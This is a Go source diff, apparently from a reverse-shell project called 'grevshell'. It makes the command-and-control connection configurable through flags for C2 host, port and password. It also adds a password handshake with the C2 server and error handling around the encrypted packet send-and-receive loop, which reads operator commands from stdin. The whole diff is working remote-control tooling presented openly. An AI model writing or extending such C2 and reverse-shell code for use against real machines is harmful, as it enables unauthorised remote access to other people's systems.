@@ -7,13 +7,26 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"flag"
 	"net"
 
 	"grevshell/grevcore"
 )
 
+var (
+	C2Host		string
+	C2Port		string
+	C2Password	string
+)
+
 func main() {
-	stream, err := net.Dial("tcp", "localhost:9999")
+	flag.StringVar(&C2Host, "h", "localhost", "Specify the host's address.")
+	flag.StringVar(&C2Port, "p", "9999", "Specify the host's port.")
+	flag.StringVar(&C2Password, "k", "", "Specify the authentication password.")
+	
+	flag.Parse()
+
+	stream, err := net.Dial("tcp", fmt.Sprintf("%s:%s", C2Host, C2Port))
 
 	if err != nil {
 		slog.Error("An error occured while establishing the server.", slog.Any("ERROR", err))
@@ -30,8 +43,28 @@ func main() {
 		return
 	}
 
+	err = grevcore.SendPacket(stream, grevcore.Packet{grevcore.AuthHeader, "", []byte(C2Password)}, key)
+
+	if err != nil {
+		slog.Error("An error occured while exchanging authentication.", slog.Any("ERROR", err))
+		return
+	}
+
+	authResponse, err := grevcore.ReceivePacket(stream, key)
+
+	if err != nil {
+		slog.Error("An error occured while receiving authentication.", slog.Any("ERROR", err))
+		return
+	}
+
+	if authResponse.Header == grevcore.AuthFail {
+		slog.Info("Authentication Failed.")
+		return
+	}
+
 	ProcessLoop(stream, key)
 }
+
 
 func ProcessLoop(c net.Conn, key []byte) {
 	send := bufio.NewReader(os.Stdin)
@@ -85,8 +118,17 @@ func ProcessLoop(c net.Conn, key []byte) {
 			packet.Data = []byte(line)
 		}
 
-		grevcore.SendPacket(c, packet, key)
-		recv := grevcore.ReceivePacket(c, key)
+		err = grevcore.SendPacket(c, packet, key)
+
+		if err != nil {
+			slog.Error("An error occured while sending the request.", slog.Any("ERROR", err))
+		}
+
+		recv, err := grevcore.ReceivePacket(c, key)
+
+		if err != nil {
+			slog.Error("An error occured while receiving the response.", slog.Any("ERROR", err))
+		}
 
 		if recv.Data == nil {
 			return
